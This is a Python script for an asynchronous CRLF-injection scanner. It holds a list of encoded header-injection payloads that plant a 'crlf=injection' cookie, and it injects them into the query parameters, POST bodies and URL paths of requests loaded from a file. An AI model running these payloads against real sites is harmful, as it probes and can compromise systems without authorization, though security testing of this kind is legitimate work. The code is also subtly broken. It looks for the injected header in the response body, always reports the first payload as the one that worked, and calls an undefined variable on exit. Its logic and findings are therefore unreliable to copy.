import json
import logging
import asyncio
import httpx
import re
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
from tabulate import tabulate
from colorama import init, Fore

# Initialize colorama for colored output
init(autoreset=True)

# Configuration
CRLF_PAYLOADS = [
    '%%0a0aSet-Cookie:crlf=injection',
    '%0aSet-Cookie:crlf=injection',
    '%0d%0aSet-Cookie:crlf=injection',
    '%0dSet-Cookie:crlf=injection',
    '%23%0aSet-Cookie:crlf=injection',
    '%23%0d%0aSet-Cookie:crlf=injection',
    '%23%0dSet-Cookie:crlf=injection',
    '%25%30%61Set-Cookie:crlf=injection',
    '%25%30aSet-Cookie:crlf=injection',
    '%250aSet-Cookie:crlf=injection',
    '%25250aSet-Cookie:crlf=injection',
    '%2e%2e%2f%0d%0aSet-Cookie:crlf=injection',
    '%2f%2e%2e%0d%0aSet-Cookie:crlf=injection',
    '%2F..%0d%0aSet-Cookie:crlf=injection',
    '%3f%0d%0aSet-Cookie:crlf=injection',
    '%3f%0dSet-Cookie:crlf=injection',
    '%u000aSet-Cookie:crlf=injection'
]
DEFAULT_TIMEOUT = 50

# Concurrency limit for async tasks
SEMAPHORE_LIMIT = 5  # You can adjust this value based on your system's capacity

async def inject_crlf_payload(session, request, semaphore):
    """
    Inject crlfpayloads into the request and test for vulnerabilities, including path-based crlf.
    
    Args:
        session: The HTTPX session.
        request: A dictionary containing request details from requests.json.
        semaphore: A semaphore for limiting concurrent requests.
    
    Returns:
        List of dictionaries containing results for each tested payload.
    """
    results = []
    url = request["url"]
    method = request.get("method", "GET").upper()
    headers = request.get("headers", {}).copy()
    body = request.get("body")
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Semaphore to limit concurrency
    async with semaphore:
        # Test GET requests with query parameters
        if method == "GET" and query_params:
            for param, values in query_params.items():
                for payload in CRLF_PAYLOADS:
                    modified_params = query_params.copy()
                    modified_params[param] = [payload for value in values]
                    new_query_string = "&".join(
                        f"{param}={value}" for param, values in modified_params.items() for value in values
                    )
                    new_url = urljoin(url, f"{parsed_url.path}?{new_query_string}")

                    result = await test_crlf(session, new_url, method, headers=headers)
                    if result and result["crlf_detected"]:
                        result["query_params"] = query_params  # Original query parameters
                        result["modified_query_params"] = modified_params  # Modified query parameters
                        result["payload"] = payload  # The payload used
                        results.append(result)
                        break  # Break after detecting crlfand move to the next request

        # Test POST requests with payloads
        elif method == "POST" and body:
            for payload in CRLF_PAYLOADS:
                if isinstance(body, str):
                    modified_body = body + payload
                    logging.debug(f"Modified body size (str): {len(modified_body)}")
                    headers.pop("Content-Length", None)
                    headers["Transfer-Encoding"] = "chunked"  # Add chunked encoding
                elif isinstance(body, dict):
                    modified_body = {key: payload for key, value in body.items()}
                    body_str = json.dumps(modified_body)
                    logging.debug(f"Modified body size (dict): {len(body_str)}")
                    headers.pop("Content-Length", None)
                    headers["Transfer-Encoding"] = "chunked"
                else:
                    modified_body = body

                # Log body size before sending request
                logging.debug(f"Sending request with body size: {len(modified_body)}")

                # Send the request with the modified body
                try:
                    result = await test_crlf(session, url, method, headers=headers, data=modified_body)
                    if result and result["crlf_detected"]:
                        result["post_data"] = body  # Original POST data
                        result["modified_post_data"] = modified_body  # Modified POST data with payload
                        result["payload"] = payload  # The payload used
                        results.append(result)
                        break  # Break after detecting crlfand move to the next request
                except Exception as e:
                    logging.error(f"Error while testing crlfpayload: {e}")
                    continue

        # Path-Based crlfDetection (only modify path)
        if method == "GET" or method == "POST":
            path_parts = parsed_url.path.split('/')

            # Look for path segments that could be vulnerable
            for i, part in enumerate(path_parts):
                if part:  # Only modify non-empty path segments
                    for payload in CRLF_PAYLOADS:
                        path_parts[i] = payload
                        modified_path = '/'.join(path_parts[:i] + [payload])
                        new_url = urlparse(url)._replace(path=modified_path).geturl()

                        # Send the request with the modified path
                        try:
                            result = await test_crlf(session, new_url, method, headers=headers)
                            if result and result["crlf_detected"]:
                                result["path"] = parsed_url.path  # Original path
                                result["modified_path"] = modified_path  # Modified path with payload
                                result["payload"] = payload  # The payload used
                                results.append(result)
                                break  # Break after detecting crlfand move to the next request
                        except Exception as e:
                            logging.error(f"Error while testing path-based crlfpayload: {e}")
                        path_parts[i] = part  # Reset path segment after testing

    return results

async def test_crlf(session, url, method, headers=None, data=None):
    """
    Send an HTTP request and test for crlfvulnerabilities.
    
    Args:
        session: The HTTPX session.
        url: The request URL.
        method: The HTTP method.
        headers: Optional headers for the request.
        data: Optional data for POST requests.
    
    Returns:
        A dictionary with the test results or None if no crlfis detected.
    """
    try:
        response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)

        for payload in CRLF_PAYLOADS:
            if re.search(r'(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlf=injection)(?:\s*?)(?:$|;)', response.text):  # Check for CRLF payload in the header
                return {
                    "url": url,
                    "method": method,
                    "status_code": response.status_code,
                    "crlf_detected": True,
                    "payload": payload
                }
        return {
            "url": url,
            "method": method,
            "status_code": response.status_code,
            "crlf_detected": False
        }
    except httpx.RequestError as e:
        logging.error(f"Error testing {url} with payload: {data}. Exception: {e}")
        return {
            "url": url,
            "method": method,
            "status_code": "Error",
            "crlf_detected": False,
            "error": str(e)
        }
    except Exception as e:
        logging.error(f"Unexpected error testing {url}: {e}")
        return {
            "url": url,
            "method": method,
            "status_code": "Error",
            "crlf_detected": False,
            "error": str(e)
        }

async def process_requests(requests):
    """
    Process all requests from requests.json and check for crlfvulnerabilities.
    
    Args:
        requests: A list of request dictionaries.
    
    Returns:
        A list of results from the crlftests.
    """
    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)  # Limit concurrent tasks
    async with httpx.AsyncClient() as session:
        tasks = [inject_crlf_payload(session, request, semaphore) for request in requests]
        results = await asyncio.gather(*tasks)
        return [item for sublist in results for item in sublist]  # Flatten the results

def load_requests(file_path):
    """
    Load requests from requests.json.
    
    Args:
        file_path: Path to the JSON file containing request details.
    
    Returns:
        A list of request dictionaries.
    """
    with open(file_path, 'r') as f:
        return json.load(f)

def save_results(results, output_file):
    """
    Save results to a JSON file.
    
    Args:
        results: List of results from the crlftests.
        output_file: Path to the output file.
    """
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)

def save_output_on_exit(sig, frame):
    """Function to save output gracefully when interrupted."""
    logging.info("Saving output before exit...")
    with open("output.json", "w") as f:
        json.dump(requests_data, f, indent=4)
    logging.info("Output saved. Exiting...")
    sys.exit(0)

def print_results(results):
    """
    Print results in a formatted table.
    
    Args:
        results: List of results from the crlftests.
    """
    # Filter results to only show detected crlfvulnerabilities
    crlf_results = [result for result in results if result["crlf_detected"]]

    if not crlf_results:
        print(Fore.YELLOW + "No crlf vulnerabilities detected.")
        return

    table_data = []
    for result in crlf_results:
        table_data.append([
            result["url"],
            result["method"],
            result["status_code"],
            Fore.RED + "crlf Detected"
        ])
    headers = ["URL", "Method", "Status Code", "crlfDetection"]
    print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))

async def main(input_file, output_file):
    """
    Main function to orchestrate the crlfdetection process.
    
    Args:
        input_file: Path to the input JSON file.
        output_file: Path to the output JSON file.
    """
    requests = load_requests(input_file)
    logging.info(f"Loaded {len(requests)} requests for testing.")

    results = await process_requests(requests)
    # Filter results to only include crlfdetections
    crlf_results = [result for result in results if result["crlf_detected"]]

    print_results(crlf_results)
    save_results(crlf_results, output_file)
    signal.signal(signal.SIGINT, save_output_on_exit)

if __name__ == "__main__":
    import argparse
    import sys
    import signal

    # Define a signal handler to save results on interrupt
    signal.signal(signal.SIGINT, save_output_on_exit)

    # Command-line argument parsing
    parser = argparse.ArgumentParser(description="crlfDetection Tool")
    parser.add_argument("--input", default="requests.json", help="Input file with requests (default: requests.json)")
    parser.add_argument("--output", default="results_crlf_linux.json", help="Output file for results (default: results_crlf_linux.json)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    # Logging configuration
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    # Run the main function in the asyncio event loop
    try:
        asyncio.run(main(args.input, args.output))
    except KeyboardInterrupt:
        print("\nExecution interrupted by user.")

